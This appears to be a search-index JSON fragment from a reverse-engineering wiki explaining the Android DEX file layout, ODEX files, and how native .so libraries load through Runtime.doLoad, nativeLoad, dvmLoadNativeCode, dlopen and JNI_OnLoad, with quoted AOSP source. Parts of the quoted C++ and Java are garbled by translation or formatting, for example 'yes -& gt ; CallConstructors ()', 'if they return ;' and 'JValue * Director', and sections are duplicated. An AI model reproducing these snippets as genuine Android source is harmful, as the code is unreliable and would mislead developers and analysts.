(method) The number of elements in the list of identifiers, up to 65535 proto_ids_off uint If proto_ids_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the proto_ids section the amount. field_ids_size uint Number of Elements in the Field Identifier List field_ids_off uint If field_ids_size == 0 , the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the field_ids section. method_ids_size uint Number of elements in the method identifier list method_ids_off uint If method_ids_size == 0 , the value is 0 . The offset, on the other hand, represents the offset from the beginning of the file to the beginning of the method_ids section. class_defs_size uint Number of elements in the class definition list class_defs_off uint If class_defs_size == 0 (which is undeniably a strange extreme case), the value is 0 ; otherwise the offset represents the offset from the beginning of the file to the beginning of the class_defs section the amount. data_size uint The size of the data section in bytes, which must be an even multiple of sizeof(uint), indicating 8-byte alignment. data_off uint The offset from the beginning of the file to the beginning of the data section.","title":"DEX file header"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-index-area","text":"","title":"DEX index area"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#string-id","text":"The StringIds section contains the stringIdsSize DexStringId structure, which has the following structure: struct DexStringId { U4 stringDataOff ; /* String data offset, which is the file offset of each StringData in the data area */ }; It can be seen that only the relative offset of each string is stored in DexStringId. In addition, each offset occupies 4 bytes, and the string portion occupies 4*stringIdsSize bytes in total. At the corresponding offset, the string is stored in the MUTF-8 format, which stores the variable of the LEB128 type we mentioned earlier, indicating the length of the string, followed by the string, followed by End of x00, the length of the string does not contain \\x00.","title":"string id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#type-id","text":"The type_ids section indexes all the types (classes, arrays, or primitive types) used in the java code. This list must be sorted by the string_id index and cannot be repeated. struct DexTypeId { U4 descriptorIdx ; /* index to the list of DexStringIds*/ };","title":"type id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#proto-id","text":"The Proto id field is mainly designed for the method prototype in java. It mainly contains the return type and parameter list of a method declaration, which is not involved in the method name. It mainly contains the following three data structures struct DexProtoId { U4 shortyIdx ; /* return type + parameter type, shorthand, index to the list of DexStringId */ U4 returnTypeIdx ; /* return type, index to the DexTypeId list */ U4 parametersOff ; /* parameter type, offset to DexTypeList*/ } struct DexTypeList { U4 size ; /* The number of DexTypeItems, that is, the number of parameters */ DexTypeItem list [ 1 ]; /* points to the beginning of the DexTypeItem*/ }; struct DexTypeItem { U2 typeIdx ; /* parameter type, index to the list of DexTypeId, and finally point to the string index */ };","title":"proto Id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#field-id","text":"The field id area is mainly designed for the fields of each class in java, mainly related to the following data structure. struct DexFieldId { U2 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U2 typeIdx ; /* field type, index to the list of DexTypeIds*/ U4 nameIdx ; /* field name, index to the DexStringId list */ };","title":"field id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#method-id","text":"The method id area is designed directly for methods in java. It contains the class in which the method resides, the prototype of the method, and the name of the method. struct DexMethodId { U2 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U2 protoIdx ; /* declaration type, index to the DexProtoId list */ U4 nameIdx ; /* method name, index to the DexStringId list */ };","title":"method id"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#class-def","text":"classDefsSize indicates the size of the class def area, and classDefsOff indicates the offset of the class def area. This area is designed for classes in java and contains the following data structures. The related information is as follows // basic information about the class struct DexClassDef { U4 classIdx ; /* The type of the class, pointing to the index of the DexTypeId list */ U4 accessFlags ; /* access flag*/ U4 superclassIdx ; /* parent class type, index to the DexTypeId list */ U4 interfacesOff ; /* interface, offset to DexTypeList*/ U4 sourceFileIdx ; /* source file name, index to the DexStringId list */ U4 annotationsOff ; /* annotation, pointing to the DexAnnotationsDirectoryItem structure */ U4 classDataOff ; /* points to the offset of the DexClassData structure */ U4 staticValuesOff ; /* points to the offset of the DexEncodedArray structure */ }; // Overview of the fields and methods of the class struct DexClassData { DexClassDataHeader header ; /* Specify the number of fields and methods */ DexField * staticFields ; /* static field, DexField structure */ DexField * instanceFields ; /* instance field, DexField structure */ DexMethod * directMethods ; /* Direct method, DexMethod structure */ DexMethod * virtualMethods ; /* virtual method, DexMethod structure */ / / Detailed description of the number of fields and the number of methods struct DexClassDataHeader { U4 staticFieldsSize ; /* number of static fields */ U4 instanceFieldsSize ; /* number of instance fields */ U4 directMethodsSize ; /* number of direct methods */ U4 virtualMethodsSize ; /* number of virtual methods */ }; // field definition struct DexField { U4 fieldIdx ; /* index to DexFieldId*/ U4 accessFlags ; /* access flag*/ }; // method definition struct DexMethod { U4 methodIdx ; /* index to DexMethodId*/ U4 accessFlags ; /* access flag*/ U4 codeOff ; /* points to the offset of the DexCode structure */ }; // Code overview struct DexCode { U2 registersSize ; /* Number of registers used */ U2 insSize ; /* number of parameters */ U2 outsSize ; /* The number of registers used by other methods when calling other methods will be applied in their own call stack and pushed (guessed) */ U2 triesSize ; /* Try/Catch number*/ U4 debugInfoOff ; /* points to the offset of the debug information */ U4 insnsSize ; /* The number of instruction sets, in units of 2 bytes */ U2 insns [ 1 ]; /* instruction set*/ };","title":"class def"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#summary","text":"It can be seen that pointing in the index area is more complicated, but at the same time it is also clever. Here is the Dalvik designer in the [Google Developer Day 2008 China] ( https://sites.google.com/site/developerdaychina/ ) speech. Give an example.","title":"Summary"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-data-area","text":"What is stored here is the various data mentioned before.","title":"DEX Data Area"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-map-section","text":"The mapOff field in DexHeader gives the offset of the DexMapList structure in the DEX file. When the Dalvik virtual machine parses the content of the DEX file, it maps the content to the DexMapList data structure. It can be said that the structure describes the overall profile of the corresponding DEX file. The specific code is as follows struct DexMapList { U4 size ; /* The number of DexMapItem, easy to parse */ DexMapItem list [ 1 ]; /* points to DexMapItem */ }; struct DexMapItem { U2 type ; /* Type at the beginning of kDexType*/ U2 unused ; /* not used for byte alignment*/ U4 size ; /* specifies the number of corresponding types */ U4 offset ; /* specifies the file offset of the corresponding type of data */ }; The /* type field is an enumeration constant, and it is easy to determine its specific type by type name. */ /* map item type codes */ enum { kDexTypeHeaderItem = 0x0000 , kDexTypeStringIdItem = 0x0001 , kDexTypeTypeIdItem = 0x0002 , kDexTypeProtoIdItem = 0x0003 , kDexTypeFieldIdItem = 0x0004 , kDexTypeMethodIdItem = 0x0005 , kDexTypeClassDefItem = 0x0006 , kDexTypeMapList = 0x1000 , kDexTypeTypeList = 0x1001 , kDexTypeAnnotationSetRefList = 0x1002 , kDexTypeAnnotationSetItem = 0x1003 , kDexTypeClassDataItem = 0x2000 , kDexTypeCodeItem = 0x2001 , kDexTypeStringDataItem = 0x2002 , kDexTypeDebugInfoItem = 0x2003 , kDexTypeAnnotationItem = 0x2004 , kDexTypeEncodedArrayItem = 0x2005 , kDexTypeAnnotationsDirectoryItem = 0x2006 , };","title":"DEX map section"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#dex-instance","text":"Specifically, you can find an apk yourself, and then you can see the corresponding result by parsing the template of 010editor.","title":"DEX instance"},{"location":"android/basic_operating_mechanism/java_layer/dex/dex/#reference-reading","text":"Android software security and reverse analysis","title":"Reference reading"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/","text":"ODEX file \u00b6 basic introduction \u00b6 We know that the code for the java layer of the Android application is in the class.dex file of the apk file. In general, we get the dex file and parse it every time we start the program. Obviously, every time we do this, the efficiency will be lower. Android developers have come up with a way to optimize dex files when they are initially loaded, and generate an ODEX file, which is stored in the /data/dalvik-cache directory. When running this program again later, we only need to load the optimized ODEX file directly, eliminating the need to optimize each time. For the Android ROM's own app, it is directly converted to an odex file and stored in the same directory as the apk, so that when the phone is turned on every time, it will be much faster. basic structure \u00b6 To be added. Generation process \u00b6 To be added. \u53c2\u8003\u9605\u8bfb \u00b6 Android software security and reverse analysis","title":"ODEX"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#odex-file","text":"","title":"ODEX file"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#basic-introduction","text":"We know that the code for the java layer of the Android application is in the class.dex file of the apk file. In general, we get the dex file and parse it every time we start the program. Obviously, every time we do this, the efficiency will be lower. Android developers have come up with a way to optimize dex files when they are initially loaded, and generate an ODEX file, which is stored in the /data/dalvik-cache directory. When running this program again later, we only need to load the optimized ODEX file directly, eliminating the need to optimize each time. For the Android ROM's own app, it is directly converted to an odex file and stored in the same directory as the apk, so that when the phone is turned on every time, it will be much faster.","title":"basic introduction"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#basic-structure","text":"To be added.","title":"basic structure"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#generation-process","text":"To be added.","title":"Generation process"},{"location":"android/basic_operating_mechanism/java_layer/dex/odex/#_1","text":"Android software security and reverse analysis","title":"\u53c2\u8003\u9605\u8bfb"},{"location":"android/basic_operating_mechanism/native_layer/so/","text":"so Introduction \u00b6 basic introduction \u00b6 Why use Shared Object(SO) Development efficiency Fast migration the version of so Different depending on the CPU platform Loading method \u00b6 System.loadLibrary If the loaded file name is xxx, then the libxxx.so file in the libs directory of the project is actually loaded. System.load Corresponds to the absolute path of lib. The first method is mainly used, and the second method is mainly used to load the so file in the plugin. loadLibrary Loading Process \u00b6 According to the official API The call System.loadLibrary(name) is effectively equivalent to the call Runtime.getRuntime().loadLibrary(name) It can be seen that the function actually calls the function loadLibrary in Runtime.java ( libcore/luni/src/main/java/java/lang/Runtime.java ), and then continues to call loadLibrary another overloaded function. Contains two parameters libame, the library name we passed in VMStack.getCallingClassLoader(), the class loader ClassLoader, is convenient for finding the corresponding library. /** * Loads and links the library with the specified name. The mapping of the * specified library name to the full path for loading the library is * implementation-dependent. * * @param libName * the name of the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void loadLibrary ( String libName ) { loadLibrary ( libName , VMStack . getCallingClassLoader ()); } /* * Searches for a library, then loads and links it without security checks. */ void loadLibrary ( String libraryName , ClassLoader loader ) { if ( loader != null ) { String filename = loader . findLibrary ( libraryName ); if ( filename == null ) { throw new UnsatisfiedLinkError ( \"Couldn't load \" + libraryName + \" from loader \" + loader + \": findLibrary returned null\" ); } String error = doLoad ( filename , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } return ; } String filename = System . mapLibraryName ( libraryName ); List < String > candidates = new ArrayList < String > (); String lastError = null ; for ( String directory : mLibPaths ) { String candidate = directory + filename ; candidates . add ( candidate ); if ( IoUtils . canOpenReadOnly ( candidate )) { String error = doLoad ( candidate , loader ); if ( error == null ) { return ; // We successfully loaded the library. Job done. } lastError = error ; } } if ( lastError != null ) { throw new UnsatisfiedLinkError ( lastError ); } throw new UnsatisfiedLinkError ( \"Library \" + libraryName + \" not found; tried \" + candidates ); } It can be seen that the main function of the program is as explained in the comments. Searches for a library, then loads and links it without security checks. The load function used in it is the doLoad function. Here, let's not continue the analysis, let's take a look at the load function. load Loading process \u00b6 According to the official API description, as follows The call System.load(name) is effectively equivalent to the call: ```java > Runtime.getRuntime (). Load (name) ``` It is also a function called Runtime.java, as follows /** * Loads and links the dynamic library that is identified through the * specified path. This method is similar to {@link #loadLibrary(String)}, * but it accepts a full path specification whereas {@code loadLibrary} just * accepts the name of the library to load. * * @param pathName * the absolute (platform dependent) path to the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void load ( String pathName ) { load ( pathName , VMStack . getCallingClassLoader ()); } /* * Loads and links the given library without security checks. */ void load ( String pathName , ClassLoader loader ) { if ( pathName == null ) { throw new NullPointerException ( \"pathName == null\" ); } String error = doLoad ( pathName , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } } It also calls the overloaded function of the two parameters of load, which in turn calls the doLoad function. Regardless of which of the above loading methods, the doLoad function in Runtime.java will be called. Core loading process \u00b6 doLoad \u00b6 Let's analyze the doLoad function as follows private String doLoad ( String name , ClassLoader loader ) { // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH, // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH. // The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load // libraries with no dependencies just fine, but an app that has multiple libraries that // depend on each other needed to load them in most-dependent-first order. // We added API to Android's dynamic linker so we can update the library path used for // the currently-running process. We pull the desired path out of the ClassLoader here // and pass it to nativeLoad so that it can call the private dynamic linker API. // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the // beginning because multiple apks can run in the same process and third party code can // use its own BaseDexClassLoader. // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any // dlopen(3) calls made from a .so's JNI_OnLoad to work too. // So, find out what the native library search path is for the ClassLoader in question... String ldLibraryPath = null ; if ( loader != null && loader instanceof BaseDexClassLoader ) { ldLibraryPath = (( BaseDexClassLoader ) loader ). getLdLibraryPath (); } // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized // internal natives. synchronized ( this ) { return nativeLoad ( name , loader , ldLibraryPath ); } } Although the source code is very long, many of them are comments, which explains why you should use such a function. The main reasons are as follows. Android apps are generated by zygote fork, so their LD_LIBRARY_PATH is zygote's LD_LIBRARY_PATH, which also means that the so files in apk are not in this path. There may be interdependencies between so files, we need to load them in the reverse direction of the dependencies. The basic idea of a function is to find the path to the library file and then call the nativeLoad function using the synchronized method. nativeload \u00b6 The nativeload function is actually a function of the native layer. // TODO: should be synchronized, but dalvik doesn't support synchronized internal natives. private static native String nativeLoad ( String filename , ClassLoader loader , String ldLibraryPath ); The corresponding file path is dalvik/vm/native/java_lang_Runtime.cpp , and the specific nativeLoad function is as follows const DalvikNativeMethod dvm_java_lang_Runtime [] = { { \"freeMemory\" , \"()J\" , Dalvik_java_lang_Runtime_freeMemory }, { & quot ; gc & quot ;, & quot ;() V & quot ;, Dalvik_java_lang_Runtime_gc }, { & quot ; maxMemory & quot ;, & quot ;() J & quot ;, Dalvik_java_lang_Runtime_maxMemory }, { \"nativeExit\" , \"(I)V\" , Dalvik_java_lang_Runtime_nativeExit }, { \"nativeLoad\" , \"(Ljava/lang/String;Ljava/lang/ClassLoader;Ljava/lang/String;)Ljava/lang/String;\" , Dalvik_java_lang_Runtime_nativeLoad }, { & quot ; totalMemory & quot ;, & quot ;() J & quot ;, Dalvik_java_lang_Runtime_totalMemory }, { NULL , NULL , ZERO }, }; It can be seen that the function corresponding to the native layer is Dalvik_java_lang_Runtime_nativeLoad, as follows /* * static String nativeLoad(String filename, ClassLoader loader, String ldLibraryPath) * * Load the specified full path as a dynamic library filled with * JNI-compatible methods. Returns null on success, or a failure * message on failure. */ static void Dalvik_java_lang_Runtime_nativeLoad ( const u4 * args , JValue * Director ) { StringObject * fileNameObj = ( StringObject * ) args [ 0 ]; Object * classLoader = ( Object * ) args [ 1 ]; StringObject * ldLibraryPathObj = ( StringObject * ) args [ 2 ]; assert ( fileNameObj != NULL ); char * fileName = dvmCreateCstrFromString ( fileNameObj ); if ( ldLibraryPathObj != NULL ) { char * ldLibraryPath = dvmCreateCstrFromString ( ldLibraryPathObj ); void * sym = dlsym ( RTLD_DEFAULT , \"android_update_LD_LIBRARY_PATH\" ); if ( sym != NULL ) { typedef void ( * Fn )( const char * ); Fn android_update_LD_LIBRARY_PATH = reinterpret_cast < Fn > ( sym ); ( * android_update_LD_LIBRARY_PATH )( ldLibraryPath ); } else { ALOGE ( \"android_update_LD_LIBRARY_PATH not found; .so dependencies will not work!\" ); } free ( ldLibraryPath ); } StringObject * result = NULL ; char * reason = NULL ; bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); if ( ! success ) { const char * msg = ( reason != NULL ) ? reason : \"unknown failure\" ; result = dvmCreateStringFromCstr ( msg ); dvmReleaseTrackedAlloc (( Object * ) result , NULL ); } free ( reason ); free ( fileName ); RETURN_PTR ( result ); } According to the comments, we can determine the key code at bool success = dvmLoadNativeCode ( fileName , classLoader , & reason ); After this line is executed, it will tell us whether the corresponding so is successful. dvmLoadNativeCode \u00b6 The basic code is as follows, we can simply judge the function of the function according to the comments: The program loads the corresponding native code according to the specified absolute path, but if the library is already loaded, it will not be loaded again. Also, as stated in JNI, we can't load a library into multiple class loaders, that is, a library will only be associated with a class loader. The basic execution flow of the function is as follows Use findSharedLibEntry to determine if the library has been loaded, and if it is already loaded, is the same class loader. /* * Load native code from the specified absolute pathname. Per the spec, * if we've already loaded a library with the specified pathname, we * return without doing anything. * * TODO? for better results we should absolutify the pathname. For fully * correct results we should stat to get the inode and compare that. The * existing implementation is fine so long as everybody is using * System.loadLibrary. * * The library will be associated with the specified class loader. The JNI * spec says we can't load the same library into more than one class loader. * * Returns \"true\" on success. On failure, sets *detail to a * human-readable description of the error or NULL if no detail is * available; ownership of the string is transferred to the caller. */ bool dvmLoadNativeCode ( const char * pathName , Object * classLoader , char ** detail ) { SharedLib * pEntry ; void * handle ; bool verbose ; /* reduce noise by not chattering about system libraries */ verbose = !! strncmp ( pathName , \"/system\" , sizeof ( \"/system\" ) -1 ); verbose = verbose && !! strncmp ( pathName , \"/vendor\" , sizeof ( \"/vendor\" ) -1 ); if ( verbose ) ALOGD ( \"Trying to load lib %s %p\" , pathName , classLoader ); * detail = NULL ; /* * See if we've already loaded it. If we have, and the class loader * matches, return successfully without doing anything. */ pEntry = findSharedLibEntry ( pathName ); if ( pEntry ! = NULL ) { if ( pEntry -> classLoader != classLoader ) { ALOGW ( \"Shared lib '%s' already opened by CL %p; can't open in %p\" , pathName , pEntry -> classLoader , classLoader ); return false ; } if ( verbose ) { ALOGD ( \"Shared lib '%s' already loaded in same CL %p\" , pathName , classLoader ); } if ( ! checkOnLoadResult ( pEntry )) return false ; return true ; } If it is not loaded, it will open the shared library with dlopen. /* * Open the shared library. Because we're using a full path, the system * doesn't have to search through LD_LIBRARY_PATH. (It may do so to * resolve this library's dependencies though.) * * Failures here are expected when java.library.path has several entries * and we have to hunt for the lib. * * The current version of the dynamic linker prints detailed information * about dlopen() failures. Some things to check if the message is * cryptic: * - make sure the library exists on the device * - verify that the right path is being opened (the debug log message * above can help with that) * - check to see if the library is valid (e.g. not zero bytes long) * - check config/prelink-linux-arm.map to ensure that the library * is listed and is not being overrun by the previous entry (if * loading suddenly stops working on a prelinked library, this is * a good one to check) * - write a trivial app that calls sleep() then dlopen(), attach * to it with \"strace -p <pid>\" while it sleeps, and watch for * attempts to open nonexistent dependent shared libs * * This can execute slowly for a large library on a busy system, so we * want to switch from RUNNING to VMWAIT while it executes. This allows * the GC to ignore us. */ Thread * self = dvmThreadSelf (); ThreadStatus oldStatus = dvmChangeStatus ( self , THREAD_VMWAIT ); handle = dlopen ( pathName , RTLD_LAZY ); dvmChangeStatus ( self , oldStatus ); if ( handle == NULL ) { * detail = strdup ( dlerror ()); ALOGE ( \"dlopen( \\\" %s \\\" ) failed: %s\" , pathName , * detail ); return false ; } The dlopen function ( bionic/linker/dlfcn.cpp ) is as follows void * dlopen ( const char * filename , int flags ) { ScopedPthreadMutexLocker locker ( & gDlMutex ); soinfo * result = do_dlopen ( filename , flags ); if ( result == NULL ) { __bionic_format_dlerror ( \"dlopen failed\" , linker_get_error_buffer ()); return NULL ; } return result ; } It will call the do_dlopen function ( bionic/linker/linker.cpp ) as follows soinfo * do_dlopen ( const char * name , int flags ) { if (( flags & ~ ( RTLD_NOW | RTLD_LAZY | RTLD_LOCAL | RTLD_GLOBAL )) != 0 ) { DL_ERR ( \"invalid flags to dlopen: %x\" , flags ); return NULL ; } set_soinfo_pool_protection ( PROT_READ | PROT_WRITE ); Soinfo * si = find_library ( name ); / / determine whether there is this library , if any , need to complete the initialization work if ( si != NULL ) { yes -& gt ; CallConstructors (); } set_soinfo_pool_protection ( PROT_READ ); if they return ; } After finding the corresponding library, si-&gt;CallConstructors(); will be used to construct the relevant information, as follows void soinfo :: CallConstructors () { if ( constructors_called ) { return ; } // We set constructors_called before actually calling the constructors, otherwise it doesn't // protect against recursive constructor calls. One simple example of constructor recursion // is the libc debug malloc, which is implemented in libc_malloc_debug_leak.so: // 1. The program depends on libc, so libc's constructor is called here. // 2. The libc constructor calls dlopen() to load libc_malloc_debug_leak.so. // 3. dlopen() calls the constructors on the newly created // soinfo for libc_malloc_debug_leak.so. // 4. The debug .so depends on libc, so CallConstructors is // called again with the libc soinfo. If it doesn't trigger the early- // out above, the libc constructor will be called again (recursively!). constructors_called = true ; if (( flags & FLAG_EXE ) == 0 && preinit_array != NULL ) { // The GNU dynamic linker silently ignores these, but we warn the developer. PRINT ( \" \\\" %s \\\" : ignoring %d-entry DT_PREINIT_ARRAY in shared library!\" , name , preinit_array_count ); } if ( dynamic != NULL ) { for ( Elf32_Dyn * d = dynamic ; d -> d_tag != DT_NULL ; ++ d ) { if ( d -> d_tag == DT_NEEDED ) { const char * library_name = strtab + d -> d_un . d_val ; TRACE ( \" \\\" %s \\\" : calling constructors in DT_NEEDED \\\" %s \\\" \" , name , library_name ); Find_loaded_library ( library_name ) -& gt ; CallConstructors (); //Check if the library is loaded } } } TRACE ( \" \\\" %s \\\" : calling constructors\" , name ); // DT_INIT should be called before DT_INIT_ARRAY if both are present. CallFunction ( \"DT_INIT\" , init_func ); CallArray ( \"DT_INIT_ARRAY\" , init_array , init_array_count , false ); } As you can see, as the comment says, if the .init function and init_array exist, the program will in turn call the code in the corresponding position in the .init function and .init_array. Related instructions are as follows #define DT_INIT 12 /* Address of initialization function */ #define DT_INIT_ARRAY 25 /* Address of initialization function array */ Create an open shared library entry and try to add it to the corresponding list for easy management. If the join fails, it will be released. /* create a new entry */ SharedLib * pNewEntry ; pNewEntry = ( SharedLib * ) calloc ( 1 , sizeof ( SharedLib )); pNewEntry -> pathName = strdup ( pathName ); pNewEntry -> handle = handle ; pNewEntry -> classLoader = classLoader ; dvmInitMutex ( & pNewEntry -> onLoadLock ); pthread_cond_init ( & pNewEntry -> onLoadCond , NULL ); pNewEntry -> onLoadThreadId = self -> threadId ; /* try to add it to the list */ SharedLib * pActualEntry = addSharedLibEntry ( pNewEntry ); if ( pNewEntry ! = pActualEntry ) { ALOGI ( \"WOW: we lost a race to add a shared lib (%s CL=%p)\" , pathName , classLoader ); freeSharedLibEntry ( pNewEntry ); return checkOnLoadResult ( pActualEntry ); } If the loading is successful, dlsym will be used to get the JNI_OnLoad function in the corresponding so file. If the function exists, it will be called. Otherwise, it will return directly. else { if ( verbose ) ALOGD ( \"Added shared lib %s %p\" , pathName , classLoader ); bool result = false ; void * vonLoad ; int version ; vonLoad = dlsym ( handle , \"JNI_OnLoad\" ); if ( vonLoad == NULL ) { ALOGD ( \"No JNI_OnLoad found in %s %p, skipping init\" , pathName , classLoader ); result = true ; } else { /* * Call JNI_OnLoad. We have to override the current class * loader, which will always be \"null\" since the stuff at the * top of the stack is around Runtime.loadLibrary(). (See * the comments in the JNI FindClass function.) */ OnLoadFunc func = ( OnLoadFunc ) vonLoad ; Object * prevOverride = self -> classLoaderOverride ; self -> classLoaderOverride = classLoader ; oldStatus = dvmChangeStatus ( self , THREAD_NATIVE ); if ( gDvm . verboseJni ) { ALOGI ( \"[Calling JNI_OnLoad for \\\" %s \\\" ]\" , pathName ); } version = ( * func )( gDvmJni . jniVm , NULL ); dvmChangeStatus ( self , oldStatus ); self -> classLoaderOverride = prevOverride ; if ( version == JNI_ERR ) { * detail = strdup ( StringPrintf ( \"JNI_ERR returned from JNI_OnLoad in \\\" %s \\\" \" , pathName ). c_str ()); } else if ( dvmIsBadJniVersion ( version )) { * detail = strdup ( StringPrintf ( \"Bad JNI version returned from JNI_OnLoad in \\\" %s \\\" : %d\" , pathName , version ). c_str ()); /* * It's unwise to call dlclose() here, but we can mark it * as bad and ensure that future load attempts will fail. * * We don't know how far JNI_OnLoad got, so there could * be some partially-initialized stuff accessible through * newly-registered native method calls. We could try to * unregister them, but that doesn't seem worthwhile. */ } else { result = true ; } if ( gDvm . verboseJni ) { ALOGI ( \"[Returned %s from JNI_OnLoad for \\\" %s \\\" ]\" , ( result ? \"successfully\" : \"failure\" ), pathName ); } } if ( result ) pNewEntry -> onLoadResult = kOnLoadOkay ; else pNewEntry -> onLoadResult = kOnLoadFailed ; pNewEntry -> onLoadThreadId = 0 ; /* * Broadcast a wakeup to anybody sleeping on the condition variable. */ dvmLockMutex ( & pNewEntry -> onLoadLock ); pthread_cond_broadcast ( & pNewEntry -> onLoadCond ); dvmUnlockMutex ( & pNewEntry -> onLoadLock ); return result ; } } to sum up \u00b6 This means that when the .so file is loaded, it will follow the function in the following order (if it doesn't exist, it will be skipped) .init function Functions in .init_array JNI_OnLoad function","title":"Android Shared Object"},{"location":"android/basic_operating_mechanism/native_layer/so/#so-introduction","text":"","title":"so Introduction"},{"location":"android/basic_operating_mechanism/native_layer/so/#basic-introduction","text":"Why use Shared Object(SO) Development efficiency Fast migration the version of so Different depending on the CPU platform","title":"basic introduction"},{"location":"android/basic_operating_mechanism/native_layer/so/#loading-method","text":"System.loadLibrary If the loaded file name is xxx, then the libxxx.so file in the libs directory of the project is actually loaded. System.load Corresponds to the absolute path of lib. The first method is mainly used, and the second method is mainly used to load the so file in the plugin.","title":"Loading method"},{"location":"android/basic_operating_mechanism/native_layer/so/#loadlibrary-loading-process","text":"According to the official API The call System.loadLibrary(name) is effectively equivalent to the call Runtime.getRuntime().loadLibrary(name) It can be seen that the function actually calls the function loadLibrary in Runtime.java ( libcore/luni/src/main/java/java/lang/Runtime.java ), and then continues to call loadLibrary another overloaded function. Contains two parameters libame, the library name we passed in VMStack.getCallingClassLoader(), the class loader ClassLoader, is convenient for finding the corresponding library. /** * Loads and links the library with the specified name. The mapping of the * specified library name to the full path for loading the library is * implementation-dependent. * * @param libName * the name of the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void loadLibrary ( String libName ) { loadLibrary ( libName , VMStack . getCallingClassLoader ()); } /* * Searches for a library, then loads and links it without security checks. */ void loadLibrary ( String libraryName , ClassLoader loader ) { if ( loader != null ) { String filename = loader . findLibrary ( libraryName ); if ( filename == null ) { throw new UnsatisfiedLinkError ( \"Couldn't load \" + libraryName + \" from loader \" + loader + \": findLibrary returned null\" ); } String error = doLoad ( filename , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } return ; } String filename = System . mapLibraryName ( libraryName ); List < String > candidates = new ArrayList < String > (); String lastError = null ; for ( String directory : mLibPaths ) { String candidate = directory + filename ; candidates . add ( candidate ); if ( IoUtils . canOpenReadOnly ( candidate )) { String error = doLoad ( candidate , loader ); if ( error == null ) { return ; // We successfully loaded the library. Job done. } lastError = error ; } } if ( lastError != null ) { throw new UnsatisfiedLinkError ( lastError ); } throw new UnsatisfiedLinkError ( \"Library \" + libraryName + \" not found; tried \" + candidates ); } It can be seen that the main function of the program is as explained in the comments. Searches for a library, then loads and links it without security checks. The load function used in it is the doLoad function. Here, let's not continue the analysis, let's take a look at the load function.","title":"loadLibrary Loading Process"},{"location":"android/basic_operating_mechanism/native_layer/so/#load-loading-process","text":"According to the official API description, as follows The call System.load(name) is effectively equivalent to the call: ```java > Runtime.getRuntime (). Load (name) ``` It is also a function called Runtime.java, as follows /** * Loads and links the dynamic library that is identified through the * specified path. This method is similar to {@link #loadLibrary(String)}, * but it accepts a full path specification whereas {@code loadLibrary} just * accepts the name of the library to load. * * @param pathName * the absolute (platform dependent) path to the library to load. * @throws UnsatisfiedLinkError * if the library can not be loaded. */ public void load ( String pathName ) { load ( pathName , VMStack . getCallingClassLoader ()); } /* * Loads and links the given library without security checks. */ void load ( String pathName , ClassLoader loader ) { if ( pathName == null ) { throw new NullPointerException ( \"pathName == null\" ); } String error = doLoad ( pathName , loader ); if ( error != null ) { throw new UnsatisfiedLinkError ( error ); } } It also calls the overloaded function of the two parameters of load, which in turn calls the doLoad function. Regardless of which of the above loading methods, the doLoad function in Runtime.java will be called.","title":"load Loading process"},{"location":"android/basic_operating_mechanism/native_layer/so/#core-loading-process","text":"","title":"Core loading process"},{"location":"android/basic_operating_mechanism/native_layer/so/#doload","text":"Let's analyze the doLoad function as follows private String doLoad ( String name , ClassLoader loader ) { // Android apps are forked from the zygote, so they can't have a custom LD_LIBRARY_PATH, // which means that by default an app's shared library directory isn't on LD_LIBRARY_PATH. // The PathClassLoader set up by frameworks/base knows the appropriate path, so we can load // libraries with no dependencies just fine, but an app that has multiple libraries that // depend on each other needed to load them in most-dependent-first order. // We added API to Android's dynamic linker so we can update the library path used for // the currently-running process. We pull the desired path out of the ClassLoader here // and pass it to nativeLoad so that it can call the private dynamic linker API. // We didn't just change frameworks/base to update the LD_LIBRARY_PATH once at the // beginning because multiple apks can run in the same process and third party code can // use its own BaseDexClassLoader. // We didn't just add a dlopen_with_custom_LD_LIBRARY_PATH call because we wanted any // dlopen(3) calls made from a .so's JNI_OnLoad to work too. // So, find out what the native library search path is for the ClassLoader in question... String ldLibraryPath = null ; if ( loader != null && loader instanceof BaseDexClassLoader ) { ldLibraryPath = (( BaseDexClassLoader ) loader ). getLdLibraryPath (); } // nativeLoad should be synchronized so there's only one LD_LIBRARY_PATH in use regardless // of how many ClassLoaders are in the system, but dalvik doesn't support synchronized // internal natives. synchronized ( this ) { return nativeLoad ( name , loader , ldLibraryPath ); } } Although the source code is very long, many of them are comments, which explains why you should use such a function. The main reasons are as follows. Android apps are generated by zygote fork, so their LD_LIBRARY_PATH is zygote's LD_LIBRARY_PATH, which also means that the so files in apk are not in this path. There may be interdependencies between so files, we need to load them in the reverse direction of the dependencies. The basic idea of a function is to find the path to the library file and then call the nativeLoad function using the synchronized 